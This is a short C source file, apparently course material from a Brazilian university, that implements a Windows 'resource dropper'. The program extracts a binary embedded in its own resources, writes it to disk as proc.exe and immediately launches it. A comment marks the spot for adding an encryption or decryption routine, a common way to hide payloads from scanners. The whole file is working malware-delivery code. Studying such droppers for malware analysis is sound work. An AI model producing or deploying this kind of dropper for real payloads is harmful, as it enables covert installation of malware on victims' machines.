// Resource Dropper
// Marcus Botacin
// UFPR - 2019

#include<stdio.h>		// Debug Prints
#include<Windows.h>		// Resource Management
#include"resource.h"	// Resources Definition

// Launch a New Process based on the dropped file name
void launch()
{
	STARTUPINFO si;
    PROCESS_INFORMATION pi;
	ZeroMemory( &si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi));
	CreateProcess(L"proc.exe",NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi );
}

// Entry Point
int main()
{
	// Handle to myself
	HMODULE h = GetModuleHandle(NULL);
	// Locate Resource
	HRSRC r = FindResource(h,MAKEINTRESOURCE(IDR_BIN1),MAKEINTRESOURCE(BIN));
	// Load Resource
	HGLOBAL rc = LoadResource(h,r);
	// Ensure nobody else will handle it
	void* data = LockResource(rc);
	// Get embedded file size
	DWORD size = SizeofResource(h,r);
	// Debug Print: file size (in KiB)
	//printf("%lld\n",size/1024);
	// Open file to drop resource content
    FILE *f = fopen("proc.exe","wb");
    // traverse byte list
    for(int i=0;i<size;i++)
    {
		// byte pointer
        unsigned char c1 = ((char*)data)[i];
        // add your encryption/decryption routine here
		// drop byte to file
        fprintf(f,"%c",c1);
    }
	// file fully written
    fclose(f);
	// launch process
	launch();
	// exit without waiting child process
	return 0;
}
